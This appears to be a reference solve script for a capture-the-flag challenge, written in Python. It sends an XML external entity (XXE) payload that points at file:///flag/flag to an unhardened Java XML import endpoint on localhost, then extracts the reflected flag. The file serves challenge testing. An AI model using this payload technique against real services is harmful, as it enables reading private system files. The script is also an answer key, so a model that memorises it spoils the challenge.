#!/usr/bin/env python3
"""Reference solve for inj4 (Catalogo).

The XML import uses an unhardened Java DocumentBuilderFactory: DOCTYPE
external entities are resolved. Point one at the flag:

    <!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///flag/flag">]>
    <record><id>12</id><title>&xxe;</title></record>

The parsed record text (including the entity's content) is reflected.
"""
import os
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8043")
FLAG_RE = re.compile(r"flag\{[^}]+\}")
XML = ('<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///flag/flag">]>'
       '<record><id>12</id><title>&xxe;</title></record>')


def main() -> int:
    for _ in range(30):
        try:
            requests.get(BASE, timeout=3)
            break
        except requests.RequestException:
            time.sleep(1)
    try:
        r = requests.post(BASE + "/import", data=XML.encode("utf-8"), timeout=15)
    except requests.RequestException as e:
        sys.stderr.write(f"unreachable: {e}\n")
        return 1
    m = FLAG_RE.search(r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag found (HTTP {r.status_code})\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
